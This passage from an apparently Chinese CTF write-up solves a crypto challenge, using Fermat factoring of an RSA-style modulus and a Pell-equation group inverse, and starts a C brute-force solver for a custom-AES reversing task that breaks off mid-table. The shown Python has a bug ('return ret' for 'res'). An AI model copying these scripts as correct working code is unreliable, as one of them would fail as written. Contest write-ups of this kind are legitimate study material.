ret</span><br></pre></td></tr></table></figure><p>之后对（X，Y）进行了e次这样的运算。</p><p>一开始想到ECC是不可逆的，所以默认了这个运算也是不可逆的，导致做了很多无用功。后来测试代码自定义数据进行计算的时候发现这个运算是可逆的，并且与a无关，也就是说a为任何值都是可逆的。所以接下来只需要拿到n的阶就能够还原X和Y（flag），现在考虑如何分解n。</p><p>由于没有其他信息可用了，那么只能硬着头皮开根号呗，没想到还真出了，那么之后就可以解了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023</span></span><br><span class="line">x=gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> x**<span class="number">2</span>-n&lt;=<span class="number">0</span>:</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">1</span>] :</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line">y=gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p=x+y</span><br><span class="line">q=x-y</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个点，因为对e求逆后的数据很大，用原始的loop跑的很慢很慢，所以需要改成快速幂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a=<span class="number">1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023</span></span><br><span class="line">x=gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> x**<span class="number">2</span>-n&lt;=<span class="number">0</span>:</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">1</span>] :</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line">y=gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p=x+y</span><br><span class="line">q=x-y</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="keyword">assert</span> p*q==n</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">D=a**<span class="number">2</span>%n</span><br><span class="line"></span><br><span class="line">xy = <span class="keyword">lambda</span> x,y : ((x[<span class="number">0</span>]*y[<span class="number">0</span>]+D*x[<span class="number">1</span>]*y[<span class="number">1</span>])%n, (x[<span class="number">0</span>]*y[<span class="number">1</span>]+y[<span class="number">0</span>]*x[<span class="number">1</span>])%n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getloop</span>(<span class="params">x, e</span>):</span></span><br><span class="line">    res = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> e!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> e &amp; <span class="number">1</span>:</span><br><span class="line">            res = xy(res, x)</span><br><span class="line">        x = xy(x, x)</span><br><span class="line">        e = e &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">(xx,yy)=getloop((<span class="number">5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110</span>, <span class="number">2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785</span>),d)</span><br><span class="line"></span><br><span class="line">Mx=(<span class="number">2</span>*yy*xx-<span class="number">1</span>)*(gmpy2.invert(yy,n)**<span class="number">2</span>)%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(yy))</span><br></pre></td></tr></table></figure><p>话说这题flag解出来是pell方程很有趣，可是除了在loop里x运算用到了pell方程外似乎没有用到了呀，难道非预期？</p><h2 id="MISS"><a href="#MISS" class="headerlink" title="MISS"></a>MISS</h2><p>这一题出题人自己写了个AES，查看代码后发现key一点用也没有，也就是说主要的流程都集中在这里：<img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912102743034.png" alt="image-20210912102743034"></p><p>那么理论上只需要简单的逆一下AES就行了。</p><p>res是16字的，subBytes操作是四字节一起运算，那么这一题和Xman结营时的re题一模一样！怀疑出题人是同一个(</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912103027685.png" alt="image-20210912103027685"></p><p>之前做的时候就是用C语言爆破，因为4字节一起所以运算量变成了256^4，现代计算机很容易就能跑出来</p><p>，把之前的代码改一下就能用了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">锘?include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> SBox[] = &#123;</span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> RevSbox[] = &#123;</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line"><span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line"><span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span 